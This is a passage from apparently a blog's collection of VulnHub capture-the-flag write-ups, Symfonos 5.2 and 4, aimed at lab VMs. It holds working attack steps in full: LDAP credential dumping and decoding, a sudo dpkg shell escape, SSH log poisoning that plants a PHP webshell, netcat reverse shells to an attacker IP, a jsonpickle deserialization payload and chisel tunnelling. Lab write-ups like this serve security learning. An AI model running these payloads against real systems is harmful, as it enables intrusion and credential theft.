aGVhZGVyKCJsb2NhdGlvbjogaG9tZS5waHAiKTsKCWV4aXQ7Cn0KfQo/Pgo8aHRtbD4KPGhlYWQ+CjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdGF0aWMvYm9vdHN0cmFwLm1pbi5jc3MiPgo8L2hlYWQ+Cjxib2R5PjxiciAvPgo8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9InJvdyBqdXN0aWZ5LWNvbnRlbnQtY2VudGVyIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTgiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIiPkxvZ2luPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGZvcm0gYWN0aW9uPSJhZG1pbi5waHAiIG1ldGhvZD0iR0VUIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgcm93Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJlbWFpbF9hZGRyZXNzIiBjbGFzcz0iY29sLW1kLTQgY29sLWZvcm0tbGFiZWwgdGV4dC1tZC1yaWdodCI+VXNlcm5hbWU8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1tZC02Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGlkPSJ1c2VybmFtZSIgY2xhc3M9ImZvcm0tY29udHJvbCIgbmFtZT0idXNlcm5hbWUiIHJlcXVpcmVkIGF1dG9mb2N1cz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgcm93Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJwYXNzd29yZCIgY2xhc3M9ImNvbC1tZC00IGNvbC1mb3JtLWxhYmVsIHRleHQtbWQtcmlnaHQiPlBhc3N3b3JkPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtNiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgaWQ9InBhc3N3b3JkIiBjbGFzcz0iZm9ybS1jb250cm9sIiBuYW1lPSJwYXNzd29yZCIgcmVxdWlyZWQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtNiBvZmZzZXQtbWQtNCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2dpbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPgoJCQkgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgICAgICA8L2Rpdj4KPGNlbnRlcj48c3Ryb25nPjw/cGhwIGVjaG8gJG1zZzsgPz48L3N0cm9uZz48L2NlbnRlcj4KPC9kaXY+CjwvYm9keT4KPC9odG1sPgoK&amp;lt;/center&amp;gt;&amp;lt;/body&amp;gt; Decoded cn=admin,dc=symfonos,dc=local:qMDdyZh3cT6eeAWD TCP/389 (LDAP) - Extract Info from LDAP Extract all information from domain ┌──(root💀kali)-[~/vulnHub/Symfonos-5.2/192.168.110.18/exploit] └─# ldapsearch -x -h $ip -D &#39;cn=admin,dc=symfonos,dc=local&#39; -w qMDdyZh3cT6eeAWD -b &#39;dc=symfonos,dc=local&#39; # extended LDIF # # LDAPv3 # base &amp;lt;dc=symfonos,dc=local&amp;gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # symfonos.local dn: dc=symfonos,dc=local objectClass: top objectClass: dcObject objectClass: organization o: symfonos dc: symfonos # admin, symfonos.local dn: cn=admin,dc=symfonos,dc=local objectClass: simpleSecurityObject objectClass: organizationalRole cn: admin description: LDAP administrator userPassword:: e1NTSEF9VVdZeHZ1aEEwYldzamZyMmJodHhRYmFwcjllU2dLVm0= # zeus, symfonos.local dn: uid=zeus,dc=symfonos,dc=local uid: zeus cn: zeus sn: 3 objectClass: top objectClass: posixAccount objectClass: inetOrgPerson loginShell: /bin/bash homeDirectory: /home/zeus uidNumber: 14583102 gidNumber: 14564100 userPassword:: Y2V0a0tmNHdDdUhDOUZFVA== mail: zeus@symfonos.local gecos: Zeus User # search result search: 2 result: 0 Success # numResponses: 4 # numEntries: 3 Decode password ┌──(root💀kali)-[~/vulnHub/Symfonos-5.2/192.168.110.18/exploit] └─# echo -n Y2V0a0tmNHdDdUhDOUZFVA== | base64 -d cetkKf4wCuHC9FET zeus:cetkKf4wCuHC9FET TCP/22 (SSH) SSH w/ zeus:cetkKf4wCuHC9FET Privilege EscalationRoot - Via Sudo (GTFO Bins) Check sudo access zeus@symfonos5:~$ sudo -l Matching Defaults entries for zeus on symfonos5: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User zeus may run the following commands on symfonos5: (root) NOPASSWD: /usr/bin/dpkg dpkg has a GTFOBins entry Exploit sudo dpkg -l !/bin/sh Root Flag # cd /root # ls proof.txt # cat proof.txt Congrats on rooting symfonos:5! ZEUS * . dZZZZZ, . * dZZZZ ZZ, * . ,AZZZZZZZZZZZ `ZZ,_ * ,ZZZZZZV&#39; ZZZZ `Z,`\\ ,ZZZ ZZ . ZZZZ `V * ZZZZV&#39; ZZ ZZZZ \\_ . . V l . ZZ ZZZZZZ . l \\ ZZ, ZZZ ZZZZZZ, . / ZZ l ZZZ ZZZ `Z, ZZ l ZZZ Z Z, `Z, * . ZZ ZZZ Z Z, `l Z ZZ V `Z \\ V ZZC l V Z l V ZR l . \\ \\ l ZA \\ C C \\ K / / K A \\ \\ | / / / \\ \\\\|/ / / __________________________________\\|/_________________________ Contact me via Twitter @zayotic to give feedback! # " }, { "title": "Vulnhub - Symfonos 4", "url": "/posts/Symfonos-4/", "categories": "Vulnhub, Linux", "tags": "exploit/file-inclusion/lfi, linux-priv-esc/linux-creds-found, exploit/python/module/jsonpickle", "date": "2022-02-06 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Sat Feb 5 19:05:16 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Symfonos-4/192.168.110.13/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Symfonos-4/192.168.110.13/scans/xml/_full_tcp_nmap.xml 192.168.110.13adjust_timeouts2: packet supposedly had rtt of -528322 microseconds. Ignoring time.Nmap scan report for 192.168.110.13Host is up, received arp-response (0.00054s latency).Scanned at 2022-02-05 19:05:16 +08 for 15sNot shown: 65533 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 64 OpenSSH 7.9p1 Debian 10 (protocol 2.0)| ssh-hostkey:| 2048 f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc6WD+nd5ZbnlOmJHKiExjfgbFX6q+QAKK3N+lsm6vntaQ3CRgdDBf37SsO5ptEHMUZrDPGBch03b0An18k6pHwSLfz5AuCTN3W0Rtqd2iFRqkhgoVatSEoESxCwULEpsRB738QhCeAfiTgHr/s5WtdQAgEoSBS6e4k8KHRD1M+8FVHrolrvJA//cQ7VzVvCDbQ/eYWh3kUjRJj/cFzY/Jpgwu0QxNhzXmHwroAjtzd0D59f/KIxG0ULyAr9aQoQVjy7fMN7wJyZZxhLLKSSMoT7G51khfn9Bwun9peI32IwZnVJ3L87fGgsSy/KdOjJDRLsGCXJNtT+jUviHAaTWz| 256 be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIh5KJU7muB4UyLIXStFY9R+LekTaOgLGzYh/sWHOO+aj7OOE8QDWgjPTSZt0uDG9+bmT3Uz8v3EY2b0QDP5X9I=| 256 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGBDJ/OjwxXNZ01JjiQXyOVhcY3z9ADXsEWJEOUMdHpd80/tcp open http syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))|_http-title: Site doesn&#39;t have a title (text/html).| http-methods:|_ Supported Methods: HEAD GET POST OPTIONS|_http-server-header: Apache/2.4.38 (Debian)MAC Address: 08:00:27:CF:4E:7F (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=2/5%OT=22%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61FEOS:59FB%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=3%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OS:OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4OS:ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)OS:ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=SOS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%QOS:=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%SOS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(OS:R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 12.408 days (since Mon Jan 24 09:18:04 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=262 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 0.54 ms 192.168.110.13Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Feb 5 19:05:31 2022 -- 1 IP address (1 host up) scanned in 15.52 secondsTCP/80 (HTTP)FFUF - common.txt┌──(root💀kali)-[~/vulnHub/Symfonos-4/192.168.110.13/loot/http]└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.13/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________.hta [Status: 403, Size: 293, Words: 22, Lines: 12].html [Status: 403, Size: 294, Words: 22, Lines: 12].hta.html [Status: 403, Size: 298, Words: 22, Lines: 12].htaccess.txt [Status: 403, Size: 302, Words: 22, Lines: 12].hta.php [Status: 403, Size: 297, Words: 22, Lines: 12].htaccess [Status: 403, Size: 298, Words: 22, Lines: 12] [Status: 200, Size: 201, Words: 18, Lines: 20].hta.txt [Status: 403, Size: 297, Words: 22, Lines: 12].php [Status: 403, Size: 293, Words: 22, Lines: 12].htpasswd [Status: 403, Size: 298, Words: 22, Lines: 12].htaccess.html [Status: 403, Size: 303, Words: 22, Lines: 12].htaccess.php [Status: 403, Size: 302, Words: 22, Lines: 12].htpasswd.html [Status: 403, Size: 303, Words: 22, Lines: 12].htpasswd.txt [Status: 403, Size: 302, Words: 22, Lines: 12].htpasswd.php [Status: 403, Size: 302, Words: 22, Lines: 12]css [Status: 301, Size: 314, Words: 20, Lines: 10]index.html [Status: 200, Size: 201, Words: 18, Lines: 20]index.html [Status: 200, Size: 201, Words: 18, Lines: 20]javascript [Status: 301, Size: 321, Words: 20, Lines: 10]js [Status: 301, Size: 313, Words: 20, Lines: 10]manual [Status: 301, Size: 317, Words: 20, Lines: 10]robots.txt [Status: 403, Size: 299, Words: 22, Lines: 12]robots.txt [Status: 403, Size: 299, Words: 22, Lines: 12]server-status [Status: 403, Size: 302, Words: 22, Lines: 12]:: Progress: [18460/18460] :: Job [1/1] :: 3155 req/sec :: Duration: [0:00:06] :: Errors: 0 :: robots.txtFFUF - directory-list-2.3-medium.txt┌──(root💀kali)-[~/vulnHub/Symfonos-4/192.168.110.13]└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e &#39;.html,.txt,.php&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.13/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________manual [Status: 301, Size: 317, Words: 20, Lines: 10]js [Status: 301, Size: 313, Words: 20, Lines: 10]javascript [Status: 301, Size: 321, Words: 20, Lines: 10]robots.txt [Status: 403, Size: 299, Words: 22, Lines: 12]sea.php [Status: 302, Size: 0, Words: 1, Lines: 1]atlantis.php [Status: 200, Size: 1718, Words: 765, Lines: 44].html [Status: 403, Size: 294, Words: 22, Lines: 12].php [Status: 403, Size: 293, Words: 22, Lines: 12]server-status [Status: 403, Size: 302, Words: 22, Lines: 12]gods [Status: 301, Size: 315, Words: 20, Lines: 10]:: Progress: [882240/882240] :: Job [1/1] :: 9472 req/sec :: Duration: [0:03:33] :: Errors: 0 :: sea.php atlantis.php godsNikto┌──(root💀kali)-[~/vulnHub/Symfonos-4/192.168.110.13]└─# nikto -ask=no -h http://192.168.110.13:80 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/Symfonos-4/192.168.110.13/scans/tcp80/tcp_80_http_nikto.txt&quot;- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.110.13+ Target Hostname: 192.168.110.13+ Target Port: 80+ Start Time: 2022-02-06 02:09:16 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.4.38 (Debian)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)+ Cookie PHPSESSID created without the httponly flag+ Entry &#39;/atlantis.php&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)+ Server may leak inodes via ETags, header found with file /, inode: c9, size: 59058b74c9871, mtime: gzip+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST + OSVDB-3268: /css/: Directory indexing found.+ OSVDB-3092: /css/: This might be interesting...+ OSVDB-3092: /manual/: Web server manual found.+ OSVDB-3268: /manual/images/: Directory indexing found.+ OSVDB-3233: /icons/README: Apache default file found.+ 7916 requests: 0 error(s) and 12 item(s) reported on remote host+ End Time: 2022-02-06 02:10:40 (GMT8) (84 seconds)---------------------------------------------------------------------------+ 1 host(s) tested atlantis.phpInitial FootholdTCP/80 (HTTP) - LFI via SSH Log Poisoning View enumerated directories robots.txt 403 Forbidden sea.php Redirects to atlantis.php atlantis.php gods hades.log poseidon.log zeus.log Compiled log files ┌──(root💀kali)-[~/vulnHub/Symfonos-4/192.168.110.13/loot/http] └─# cat *.log | tee compiled.log Hades was the god of the underworld and the name eventually came to also describe the home of the dead as well. He was the oldest male child of Cronus and Rhea. Hades and his brothers Zeus and Poseidon defeated their father and the Titans to end their reign, claiming rulership over the cosmos. Poseidon was the god of the sea, earthquakes and horses. Although he was officially one of the supreme gods of Mount Olympus, he spent most of his time in his watery domain. Poseidon was brother to Zeus and Hades. These three gods divided up creation. Zeus is the god of the sky, lightning and thunder in Ancient Greek religion and myth, and king of the gods on Mount Olympus. Zeus is the sixth child of Kronos and Rhea, king and queen of the Titans. Generate a wordlist w/ the log files ┌──(root💀kali)-[~/vulnHub/Symfonos-4/192.168.110.13/loot/http] └─# cewl localhost/compiled.log -w log_cewl.txt CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/) Attempt SQLi Auth Bypass at atlantis.php Logs files from /gods can be selected .log is appened $_GET[&#39;file&#39;].&quot;log&quot; Probably susceptible to LFI RCE via LFI + SSH Log Poisoning Fuzz for LFI ┌──(root💀kali)-[~/vulnHub/Symfonos-4/192.168.110.13/loot/http] └─# ffuf -H &quot;Cookie: PHPSESSID=pmc64gq88vib60fojnikpqilgp&quot; -u http://192.168.110.13/sea.php?file=../../../../../../../../../..FUZZ -w /usr/share/wordlists/LFI/file_inclusion_linux.txt -fw 56 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.110.13/sea.php?file=../../../../../../../../../..FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/LFI/file_inclusion_linux.txt :: Header : Cookie: PHPSESSID=pmc64gq88vib60fojnikpqilgp :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 56 ________________________________________________ /var/log/auth [Status: 200, Size: 21130, Words: 2634, Lines: 225] :: Progress: [2249/2249] :: Job [1/1] :: 4584 req/sec :: Duration: [0:00:04] :: Errors: 0 :: /var/log/auth.log, might be able to do log file poisoning via SSH If we try to authenticate w/ SSH, the username field is logged, therefore we can insert a webshell at the username field to do RCE. More info Poison log file ┌──(root💀kali)-[~/vulnHub/Symfonos-4/192.168.110.13/loot/http] └─# ssh &#39;&amp;lt;?php echo system($_GET[&quot;c&quot;]); exit; ?&amp;gt;&#39;@$ip The authenticity of host &#39;192.168.110.13 (192.168.110.13)&#39; can&#39;t be established. ED25519 key fingerprint is SHA256:ntMXt1jIeiDKNEuRMRXU6uCVo/fmwaEqmxDA5r4nwds. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;192.168.110.13&#39; (ED25519) to the list of known hosts. &amp;lt;?php echo system($_GET[&quot;c&quot;]); exit; ?&amp;gt;@192.168.110.13&#39;s password: Test for RCE ┌──(root💀kali)-[~/vulnHub/Symfonos-4/192.168.110.13/loot/http] └─# curl -s -H &quot;Cookie: PHPSESSID=pmc64gq88vib60fojnikpqilgp&quot; &quot;http://192.168.110.13/sea.php?file=../../../../../var/log/auth&amp;amp;c=id&quot; | grep &quot;www-data&quot; Feb 5 12:37:30 symfonos4 sshd[1043]: Invalid user uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data) Check if python exists ┌──(root💀kali)-[~/vulnHub/Symfonos-4/192.168.110.13/loot/http] └─# curl -s -H &quot;Cookie: PHPSESSID=pmc64gq88vib60fojnikpqilgp&quot; &quot;http://192.168.110.13/sea.php?file=../../../../../var/log/auth&amp;amp;c=which+nc&quot; | grep nc /usr/bin/nc Execute reverse shell ┌──(root💀kali)-[~/vulnHub/Symfonos-4/192.168.110.13/loot/http]└─# curl -s -H &quot;Cookie: PHPSESSID=pmc64gq88vib60fojnikpqilgp&quot; &quot;http://$ip/sea.php?file=../../../../../var/log/auth&amp;amp;c=nc+192.168.110.4+4444+-e+/bin/bash&quot; www-data shell Privilege EscalationPoseidon - Via Creds Found Obtain SQL Creds, earlier there is a login page, so there will be credentials at atlantis.php to connect to the database. Proceed to /var/www/html View atlantis.php root:yVzyRGw3cG2Uyt2r Try to switch to posideon w/ yVzyRGw3cG2Uyt2r Access SQL to obtain more credentials poseidon@symfonos4:/var/www/html$ mysql -u root -p Enter password: yVzyRGw3cG2Uyt2r Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 23 Server version: 10.3.15-MariaDB-1 Debian 10 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. MariaDB [(none)]&amp;gt; show databases; +--------------------+ | Database | +--------------------+ | db | | information_schema | | mysql | | performance_schema | +--------------------+ 4 rows in set (0.025 sec) MariaDB [(none)]&amp;gt; use db Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [db]&amp;gt; show tables; +--------------+ | Tables_in_db | +--------------+ | users | +--------------+ 1 row in set (0.000 sec) MariaDB [db]&amp;gt; select * from users; +----------+------------------------------------------------------------------+ | username | pwd | +----------+------------------------------------------------------------------+ | admin | b674f184cd52edabf2c38c0142452c0af7e21f71e857cebb856e3ad7714b99f2 | +----------+------------------------------------------------------------------+ 1 row in set (0.000 sec) Unable to crack SHA-256 hashRoot - Via Misconfigured Web Application + JsonPickle Check proccess running as root poseidon@symfonos4:/opt/code$ ps aux | grep root ... root 388 0.0 1.4 23448 14972 ? Ss 11:04 0:01 /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app root is running a webserver at localhost:8080 Find world writable files Nothing stands out Find world writable directory poseidon@symfonos4:/opt$ find / -writable -type d 2&amp;gt;/dev/null | grep -v &quot;/proc&quot; /run/user/1000 /run/user/1000/gnupg /run/user/1000/systemd /run/lock /home/poseidon /home/poseidon/.gnupg /home/poseidon/.gnupg/private-keys-v1.d /sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service /sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope /sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service /sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope /opt/code &amp;lt;- Suspicious /var/lib/php/sessions /var/tmp /dev/mqueue /dev/shm /tmp /opt/code View files in /opt/code poseidon@symfonos4:/opt/code$ ls -la total 28 drwxr-xrwx 4 root root 4096 Feb 5 13:07 . drwxr-xr-x 3 root root 4096 Aug 18 2019 .. -rw-r--r-- 1 root root 942 Aug 19 2019 app.py -rw-r--r-- 1 root root 1536 Aug 19 2019 app.pyc drwxr-xr-x 4 root root 4096 Aug 19 2019 static drwxr-xr-x 2 root root 4096 Aug 19 2019 templates -rw-r--r-- 1 poseidon poseidon 0 Feb 5 13:07 test -rw-r--r-- 1 root root 215 Aug 19 2019 wsgi.pyc poseidon@symfonos4:/opt/code$ app.py is probably the webserver We could overwrite app.py to spawn a root shell, but we have to restart the webserver for it to work. View app.py jsonpickle module is used It is used for the serialization and deserialization of Python object structures. vulnerable to RCE https://www.exploit-db.com/exploits/49585 This is similar to node.js deserialization exploit Line 16-25: Checks if cookie has username variable, if not set, redirect to /whoami Create a variable u, assign User(&quot;Poseidon&quot;) to it Use jsonpickle to transform the object u into a JSON string Base64 encode JSON String Set cookie w/ encoded JSON String Port forward w/ chisel to access the webserver on our kail Kali ┌──(root💀kali)-[~/vulnHub/Symfonos-4/192.168.110.13] └─# chisel server --reverse --port 1337 Target poseidon@symfonos4:/tmp$ ./chiselLinux32 client 192.168.110.4:1337 R:8888:127.0.0.1:8080 &amp;amp; Access the webserver @ http://localhost:8888 Intercept to view our cookie Exploit jsonpickle by constructing our own cookie to execute a reverse shell Decode it ┌──(root💀kali)-[~/vulnHub/Symfonos-4/192.168.110.13/loot]└─# echo -n eyJweS9vYmplY3QiOiAiYXBwLlVzZXIiLCAidXNlcm5hbWUiOiAiUG9zZWlkb24ifQ== | base64 -d{&quot;py/object&quot;: &quot;app.User&quot;, &quot;username&quot;: &quot;Poseidon&quot;} Create payload {&quot;py/object&quot;: &quot;__main__.Shell&quot;, &quot;py/reduce&quot;: [{&quot;py/type&quot;: &quot;os.system&quot;}, {&quot;py/tuple&quot;: [&quot;nc 192.168.110.4 4444 -e /bin/bash&quot;]}, null, null, null]} Encode Payload Replace cookie w/ our payload Root Flag cd /rootlsproof.txtcat proof.txt Congrats on rooting symfonos:4! ~ ~ ~ w W w ~ \\ | / ~ ~ ~ ~ \\.|./ ~ | ~ ~ | ~ o ~ .:.:.:. | ~ ~ wwWWWww // ~ ((c ))&quot;&quot;&quot;(( //| ~ o /\\/\\(( (( 6 6 )) // | ~ (d d (( )))^((( // | o / / c((-(((&#39;)))-.// | ~ /===/ `) (( )))(( ,_/ |~ ~ /o o/ / c((( (()) | | ~ ~ ~ `~`^ / c ((( )) | | ~ /c c((( ( | ~ | ~ ~ / c ((( . | | ~ ~ / c c ((^^^^^^`\\ ~ | ~ ~ |c c c c((^^^ ^^^`\\ | ~ \\ c c c(^^^^^^^^`\\ | ~ ~ `\\ c c c;`\\^^^^^./ | ~ `\\c c c ;/^^^^^/ | ~ ~ ~ `\\ c c /^^^^/&#39; ~ | ~ ~ `;c |^^/&#39; o .-. ,&#39; c c//^\\\\ ~ ~ ( @ `.`c -///^\\\\\\ ~ ~ \\ -` c__/|/ \\| ~ `---&#39; &#39; ~ &#39; ~ ~ ~ ~ ~ ~ Contact me via Twitter @zayotic to give feedback! Root - Via Misconfigured Web Application Since we have write access to /opt/code directory, we can replace /opt/code/app.py w/ a python script that will create root shell Exploit Create backup of app.py poseidon@symfonos4:/tmp$ cp /opt/code/app.py /tmp/app.py.bak poseidon@symfonos4:/tmp$ Remove /opt/code/app.py Create python script to create rootbash nano /opt/code/app.py # See screenshot After about 25mins, gunicorn command is executed again &amp;amp; rootbash is created pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855 ██▓███ ██████ ██▓███ ▓██ ██▓ ▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒ ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░ ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░ ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░ ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒ ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░ ░░ ░ ░ ░ ░░ ▒ ▒ ░░ ░ ░ ░ ░ ░ Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive) Draining file system events due to startup... done 2022/02/06 00:53:31 CMD: UID=0 PID=96 | 2022/02/06 00:53:31 CMD: UID=0 PID=9 | 2022/02/06 00:53:31 CMD: UID=1000 PID=845 | ./pspy32 2022/02/06 00:53:31 CMD: UID=0 PID=838 | 2022/02/06 00:53:31 CMD: UID=0 PID=8 | 2022/02/06 00:53:31 CMD: UID=1000 PID=773 | -bash 2022/02/06 00:53:31 CMD: UID=1000 PID=772 | sshd: poseidon@pts/2 2022/02/06 00:53:31 CMD: UID=0 PID=766 | sshd: poseidon [priv] 2022/02/06 00:53:31 CMD: UID=1000 PID=763 | -bash 2022/02/06 00:53:31 CMD: UID=1000 PID=762 | sshd: poseidon@pts/1 2022/02/06 00:53:31 CMD: UID=0 PID=756 | sshd: poseidon [priv] 